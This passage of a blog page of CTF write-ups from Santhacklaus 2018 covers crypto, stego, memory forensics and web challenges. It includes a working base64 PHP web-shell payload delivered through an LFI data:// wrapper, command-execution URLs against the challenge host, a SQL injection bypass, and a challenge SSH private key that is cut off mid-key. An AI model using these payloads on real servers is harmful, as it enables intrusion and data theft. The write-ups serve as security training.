+00000020  e0 65 e1 f8 07 44 fb 65  2a 47 33 2d 72 6c b8 c2  |.e...D.e*G3-rl..|
+00000030  45 4f 87 02 2d c7 8e f8  16 6c 5b 9d a4 b2 b4 9e  |EO..-....l[.....|
+00000040
+
+</code></pre>
+
+<h2 id="decrypt-the-file">Decrypt the file</h2>
+
+<pre><code class="language-bash">$ openssl enc -aes-256-cbc -d -in encryptedMessage
+enter aes-256-cbc decryption password:
+*** WARNING : deprecated key derivation used.
+Using -iter or -pbkdf2 would be better.
+IMTLD{Th1S_w4s_4_R3allY_w3aK_RS4_k3y}
+</code></pre>
+
+<h2 id="flag-26">Flag</h2>
+
+<blockquote>
+<p>IMTLD{Th1S_w4s_4_R3allY_w3aK_RS4_k3y}</p>
+</blockquote>
+
+<h1 id="3d-industry-1-2">3D Industry <sup>1</sup>&frasl;<sub>2</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>3D Industry <sup>1</sup>&frasl;<sub>2</sub></td>
+<td>Web</td>
+<td>400</td>
+<td>~ 100</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-27">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_3dindustry_1.png" alt="" />
+<em>Fig 1</em>: &ldquo;3D Industry&rdquo; part 1 statement
+</center></p>
+
+<h2 id="state-of-the-art-14">State of the art</h2>
+
+<p>Here the index page:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/3dindustry1_1.png" alt="" />
+<em>Fig 2</em>: First part index
+</center></p>
+
+<p>By browsing the website as a normal user, I noticed the <strong>file</strong> GET parameter. It smells Local File Inclusion.</p>
+
+<h2 id="local-file-inclusion-rce">Local File Inclusion -&gt; RCE</h2>
+
+<p>I tried to use classical payload but nothing. In web pentest, when I run out of ideas, I&rsquo;m going on Swissky&rsquo;s github: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#lfi--rfi-using-wrappers">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#lfi--rfi-using-wrappers</a></p>
+
+<p>And obviously it was a good idea because the following payload works:</p>
+
+<blockquote>
+<p>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</p>
+</blockquote>
+
+<p>If the above line returns &ldquo;Shell done!&rdquo;, then the RCE is in place.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<blockquote>
+<p><a href="https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=">https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/3dindustry1_2.png" alt="" />
+<em>Fig 3</em>: RCE in da place
+</center></p>
+
+<p>Let&rsquo;s try the <code>id</code> linux command:</p>
+
+<blockquote>
+<p><a href="https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=id">https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=id</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/3dindustry1_3.png" alt="" />
+<em>Fig 4</em>: id linux command output
+</center></p>
+
+<p>I have to find the flag:</p>
+
+<blockquote>
+<p><a href="https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=ls%20-la">https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=ls%20-la</a></p>
+</blockquote>
+
+<pre><code class="language-bash">total 68
+dr-xr-xr-x 8 1001 1001 4096 Dec 12 08:33 .
+drwxr-xr-x 1 root root 4096 Dec 14 19:15 ..
+-r-xr-xr-x 1 1001 1001 8196 Dec 12 08:33 .DS_Store
+dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 .hidden
+-r-xr-xr-x 1 1001 1001  267 Dec 12 08:33 accueil.php
+dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 admin
+dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 config
+-r-xr-xr-x 1 1001 1001  448 Dec 12 08:33 contact.php
+-r-xr-xr-x 1 1001 1001  996 Dec 12 08:33 creations.php
+dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 inc
+-r-xr-xr-x 1 1001 1001  580 Dec 12 08:33 index.php
+dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 lang
+-r-xr-xr-x 1 1001 1001  125 Dec 12 08:33 lang.php
+-r-xr-xr-x 1 1001 1001  461 Dec 12 08:33 services.php
+dr-xr-xr-x 2 1001 1001 4096 Dec 12 08:33 style
+</code></pre>
+
+<p>There is an hidden directory <code>.hidden</code>&hellip; That contains a directory <code>this</code>&hellip; It will be a long trip&hellip;</p>
+
+<blockquote>
+<p>view-source:<a href="https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=ls%20-la%20.hidden">https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=ls%20-la%20.hidden</a></p>
+</blockquote>
+
+<pre><code class="language-bash">total 20
+dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 .
+dr-xr-xr-x 8 1001 1001 4096 Dec 12 08:33 ..
+-r-xr-xr-x 1 1001 1001 6148 Dec 12 08:33 .DS_Store
+dr-xr-xr-x 3 1001 1001 4096 Dec 12 08:33 this
+</code></pre>
+
+<p>There are 5 or 6 directories nested together, so here is the final payload:</p>
+
+<blockquote>
+<p>view-source:<a href="https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=cat%20.hidden/this/is/the/path/to/the/flag/flag.txt">https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=cat%20.hidden/this/is/the/path/to/the/flag/flag.txt</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/3dindustry1_4.png" alt="" />
+<em>Fig 5</em>: Flag :D
+</center></p>
+
+<h2 id="flag-27">Flag</h2>
+
+<blockquote>
+<p>IMTLD{B3w4r30fURL1nclud3}</p>
+</blockquote>
+
+<h1 id="3d-industry-2-2">3D Industry <sup>2</sup>&frasl;<sub>2</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>3D Industry <sup>2</sup>&frasl;<sub>2</sub></td>
+<td>Stega</td>
+<td>200</td>
+<td>~ 63</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-28">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_3dindustry_2.png" alt="" />
+<em>Fig 1</em>: &ldquo;3D Industry&rdquo; part 2 statement
+</center></p>
+
+<h2 id="state-of-the-art-15">State of the art</h2>
+
+<p>According to the previous part, we got an RCE on the web server. In the previous we browsed the <code>.hidden</code> directory to find the first flag.</p>
+
+<p>Here the statement says: &ldquo;some sensitives files he uploads in the administration section&rdquo;, near of the <code>.hidden</code> directory, there is an <code>admin</code> directory.</p>
+
+<h2 id="sensitive-data">Sensitive data</h2>
+
+<p>Still with the RCE, we can easily find: <strong>admin/uploads/s3cr37-d0cum3n7.txt</strong></p>
+
+<p>It contains a LOT of base64 data:</p>
+
+<blockquote>
+<p>view-source:<a href="https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=cat%20admin/uploads/s3cr37-d0cum3n7.txt">https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=cat%20admin/uploads/s3cr37-d0cum3n7.txt</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/3dindustry2_1.png" alt="" />
+<em>Fig 2</em>: Secret file data
+</center></p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+import requests
+import base64
+
+r = requests.get(&quot;https://3d-industry.santhacklaus.xyz/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=cat%20admin/uploads/s3cr37-d0cum3n7.txt&quot;)
+
+data = base64.b64decode(r.text.split('\n')[-13])
+
+f = open('s3cr37-d0cum3n7.txt','wb')
+f.write(data)
+f.close()
+</code></pre>
+
+<pre><code class="language-bash">$ extract.py 
+$ file s3cr37-d0cum3n7.txt
+s3cr37-d0cum3n7.txt: data
+
+$ strings s3cr37-d0cum3n7.txt | less 
+SketchUp STL com.sketchup.SketchUp.2018                                         
+ AOq
+ AOq
+[...]
+
+$ mv s3cr37-d0cum3n7.txt challenge.stl
+</code></pre>
+
+<p>Yay, sketchup file&hellip; :&lsquo;(</p>
+
+<h2 id="open-the-stl-data">Open the STL data</h2>
+
+<p>In fact, you can download and use Sketchup viewer for free. But it&rsquo;s only available on Windows, and you need graphic acceleration to run the software (my virtual machine doesn&rsquo;t have this feature). So I just stole Haax&rsquo;s computer to open the file and get:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/3dindustry2_2.jpg" alt="" />
+<em>Fig 3</em>: Secret file data
+</center></p>
+
+<h2 id="flag-28">Flag</h2>
+
+<blockquote>
+<p>IMTLD{3d1s4w3s0m3}</p>
+</blockquote>
+
+<h1 id="j-l-c-s-v-b-d">J.L.C.S.V.B.D</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>J.L.C.S.V.B.D</td>
+<td>Stega</td>
+<td>450</td>
+<td>34</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-29">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_jsvdlsb.png" alt="" />
+<em>Fig 1</em>: &ldquo;J.L.C.S.V.B.D&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-16">State of the art</h2>
+
+<p>Ok, so we&rsquo;re starting with a beautiful picture of JCVD:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/jcvdlsb_1.png" alt="" />
+<em>Fig 2</em>: Challenge material
+</center></p>
+
+<p>The title gives me an hint about the trick to use: LSB. Then go to: <a href="https://incoherency.co.uk/image-steganography/#unhide">https://incoherency.co.uk/image-steganography/#unhide</a>
+Or: <a href="https://aperisolve.fr">https://aperisolve.fr</a></p>
+
+<p>We can notice a little QR Code:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/jcvdlsb_2.png" alt="" />
+<em>Fig 3</em>: QRCode
+</center></p>
+
+<p>We can see a kind of grid, maybe LSB every two pixels.</p>
+
+<h2 id="extraction">Extraction</h2>
+
+<p>In fact there are 3 QR Code inside the picture, one qr code for each color layer (red, blue, green).</p>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+from PIL import Image
+
+im = Image.open('challenge.png')
+
+lar = im.size[0]
+hau = im.size[1]
+orig_pix = im.load()
+
+for k in range(0,3):
+  bg = Image.new('RGB', (lar,hau), 'white')
+  bg_pix = bg.load()
+  final = []
+  a = []
+  for i in range(0,lar,2):
+    buf = []
+    for j in range(0,hau,2):
+      red = orig_pix[i,j][0]
+      green = orig_pix[i,j][1]
+      blue = orig_pix[i,j][2]
+      a = [red, green, blue]
+      
+      buf.append(red &amp; 1)
+      if a[k] &amp; 1:
+        bg_pix[i/2,j/2] = (255,255,255)
+      else:
+        bg_pix[i/2,j/2] = (0,0,0)
+    final.append(buf)
+  bg.save('qr'+str(k)+'.png')
+</code></pre>
+
+<p>It gives those files:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/qr0.png" alt="" />
+<em>Fig 4</em>: QRCode 1
+</center></p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/qr1.png" alt="" />
+<em>Fig 5</em>: QRCode 2
+</center></p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/qr2.png" alt="" />
+<em>Fig 6</em>: QRCode 3
+</center></p>
+
+<h2 id="flag-29">Flag</h2>
+
+<pre><code class="language-bash">$ for i in {0..2}; do zbarimg -q --raw qr$i.png; done | tr -d '\n'
+IMTLD{st3g4n0Gr4pHY_s0m3t1M35_n33d5_s0m3_gu3sSiNg}
+</code></pre>
+
+<h1 id="bret-stiles">Bret Stiles</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Bret Stiles</td>
+<td>Forensic</td>
+<td>500</td>
+<td>23</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-30">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_bretstiles.png" alt="" />
+<em>Fig 1</em>: Bret Stiles statement
+</center></p>
+
+<h2 id="state-of-the-art-17">State of the art</h2>
+
+<p>A memory dump &lt;3</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/8g63zqQ5RPt60/giphy.gif" alt="" />
+</center></p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp imageinfo
+[Some garbage errors]
+Suggested Profile(s) : Win10x64_17134, Win10x64_10240_17770, Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393, Win10x64_16299, Win10x64_15063 (Instantiated with Win10x64_15063)
+                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
+                     AS Layer3 : FileAddressSpace (/home/monique/Téléchargements/bretstiles/challenge.dmp)
+                      PAE type : No PAE
+                           DTB : 0x1aa000L
+                          KDBG : 0xf80150ad4a60L
+          Number of Processors : 1
+     Image Type (Service Pack) : 0
+                KPCR for CPU 0 : 0xfffff80150b2d000L
+             KUSER_SHARED_DATA : 0xfffff78000000000L
+           Image date and time : 2018-11-05 20:50:14 UTC+0000
+     Image local date and time : 2018-11-05 12:50:14 -0800
+</code></pre>
+
+<p>Yay Windows 10&hellip; :&lsquo;(</p>
+
+<h2 id="find-the-right-profile">Find the right profile</h2>
+
+<p>First things to do is finding the correct Windows 10 profile for volatility. After some test, I finally find: <code>Win10x64_10586</code></p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win10x64_10586 pstree
+
+Name                                                  Pid   PPid   Thds   Hnds Time
+-------------------------------------------------- ------ ------ ------ ------ ----
+ 0xffffe0009342b680:System                              4      0    103      0 2018-11-05 20:47:01 UTC+0000
+. 0xffffe00094897040:smss.exe                         272      4      3      0 2018-11-05 20:47:01 UTC+0000
+.. 0xffffe000952c6080:smss.exe                        412    272      0 ------ 2018-11-05 20:47:08 UTC+0000
+... 0xffffe000951e8540:csrss.exe                      432    412     10      0 2018-11-05 20:47:08 UTC+0000
+... 0xffffe00095395080:winlogon.exe                   484    412      5      0 2018-11-05 20:47:08 UTC+0000
+.... 0xffffe0009566d640:dwm.exe                       772    484     12      0 2018-11-05 20:47:09 UTC+0000
+.... 0xffffe00095ddc680:userinit.exe                 2332    484      0 ------ 2018-11-05 20:47:33 UTC+0000
+..... 0xffffe00095dda500:explorer.exe                2348   2332     58      0 2018-11-05 20:47:33 UTC+0000
+...... 0xffffe00096164080:OneDrive.exe               3328   2348     18      0 2018-11-05 20:47:53 UTC+0000
+...... 0xffffe000961ae3c0:mspaint.exe                3372   2348      7      0 2018-11-05 20:47:56 UTC+0000
+...... 0xffffe000961257c0:VBoxTray.exe               3252   2348     13      0 2018-11-05 20:47:52 UTC+0000
+...... 0xffffe0009474f080:cmd.exe                    2144   2348      5      0 2018-11-05 20:50:05 UTC+0000
+....... 0xffffe00094841080:conhost.exe               3352   2144      3      0 2018-11-05 20:50:05 UTC+0000
+ 0xffffe00095df8080:NisSrv.exe                       2112    524      7      0 2018-11-05 20:47:30 UTC+0000
+[...]
+</code></pre>
+
+<p>It looks to work, let&rsquo;s continue the analysis.</p>
+
+<h2 id="file-list">File list</h2>
+
+<p>In a forensic challenge, I immediately list all opened file in memory, using <code>filescan</code> plugin:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win10x64_10586 filescan &gt; filescan.txt 
+
+$ cat filescan.txt| grep John | grep Desktop
+0x0000e000948df780  32768      1 R--rwd \Device\HarddiskVolume2\Users\John\Desktop
+0x0000e000956917a0      2      0 R--rwd \Device\HarddiskVolume2\Users\John\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini
+0x0000e00095e65320  32768      1 R--rwd \Device\HarddiskVolume2\Users\John\Desktop
+0x0000e00095f03090     16      0 R--rwd \Device\HarddiskVolume2\Users\John\Desktop\desktop.ini
+0x0000e0009600df20      2      0 R--rwd \Device\HarddiskVolume2\Users\John\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini
+0x0000e00096087a20      2      0 R--rwd \Device\HarddiskVolume2\Users\John\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini
+0x0000e0009608abe0      8      0 R--r-d \Device\HarddiskVolume2\Users\John\Desktop\bob.png
+0x0000e000960c0700  32768      1 R--rw- \Device\HarddiskVolume2\Users\John\Desktop
+</code></pre>
+
+<p>We can notice &ldquo;bob.png&rdquo; on the Desktop, let&rsquo;s extract it:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win10x64_10586 dumpfiles -Q 0x0000e000960c0700 -D .
+</code></pre>
+
+<p>Aaaaaaaaaand&hellip; Nothing. Ok, not a problem, I got more than one trick in my hat :D</p>
+
+<h2 id="process-memory-dump-in-gimp">Process memory dump in GIMP</h2>
+
+<p>During my search for a correct profile, I noticed the <code>mspaint.exe</code> process. According to this website: <a href="https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html">https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html</a></p>
+
+<p>I tried to dump the process memory and open it in GIMP as raw picture.</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win10x64_10586 memdump -p 3372 -D .
+************************************************************************
+Writing mspaint.exe [  3372] to 3372.dmp
+
+$ mv 3372.dmp mspaint.data
+</code></pre>
+
+<p>After few minutes burning my eyes, I finally found the Graal:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/bret_1.png" alt="" />
+<em>Fig 2</em>: Bret Stiles statement
+</center></p>
+
+<h2 id="flag-30">Flag</h2>
+
+<blockquote>
+<p>IMTLD{1m4gin4ti0N}</p>
+</blockquote>
+
+<h2 id="fun-fact">Fun fact</h2>
+
+<p>You can use <code>strings</code> and <code>grep</code>, best friends of forensic analysts:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/bret_2.png" alt="" />
+<em>Fig 3</em>: Kiss shutdown
+</center></p>
+
+<h1 id="netrunner-1-3">NetRunner <sup>1</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>NetRunner <sup>1</sup>&frasl;<sub>3</sub></td>
+<td>Web</td>
+<td>500</td>
+<td>24</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-31">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_netrunner1.png" alt="" />
+<em>Fig 1</em>: &ldquo;NetRunner <sup>1</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-18">State of the art</h2>
+
+<p>Ok, we got a sexy website:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/netrunner1_1.png" alt="" />
+<em>Fig 2</em>: Sexy website
+</center></p>
+
+<p>A login form, we don&rsquo;t have to use scanner or something like that, I want to say &ldquo;SQL injection&rdquo;.</p>
+
+<p>After several tries, indeed, it&rsquo;s a full blind sql injection:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/netrunner1_2.gif" alt="" />
+<em>Fig 3</em>: Time based SQL Injection
+</center></p>
+
+<h2 id="bypass">Bypass</h2>
+
+<p>I could try to script something or use SQLMap to extract all the database. And it&rsquo;s probably that&rsquo;s what I would have done before SIGSEGv1 event.</p>
+
+<p>I was near Geluchat during the CTF and he first blooded one of the hardest web challenge. He also explained me how he did. During his SQL injection he played with <code>LIMIT</code> SQL statement, let&rsquo;s try here:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/netrunner1_3.gif" alt="" />
+<em>Fig 4</em>: Bypass form
+</center></p>
+
+<h2 id="flag-31">Flag</h2>
+
+<blockquote>
+<p>IMTLD{w3b_1nT3rf4ceS_4r3_3v1L}</p>
+</blockquote>
+
+<h1 id="netrunner-2-3">NetRunner <sup>2</sup>&frasl;<sub>3</sub></h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>NetRunner <sup>2</sup>&frasl;<sub>3</sub></td>
+<td>App-Script</td>
+<td>750</td>
+<td>18</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-32">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_netrunner2.png" alt="" />
+<em>Fig 1</em>: &ldquo;NetRunner <sup>2</sup>&frasl;<sub>3</sub>&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-19">State of the art</h2>
+
+<p>At the end of the previous challenge we got the SSH private key of <strong>puppet-master</strong> user:</p>
+
+<pre><code class="language-raw">-----BEGIN RSA PRIVATE KEY-----
+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
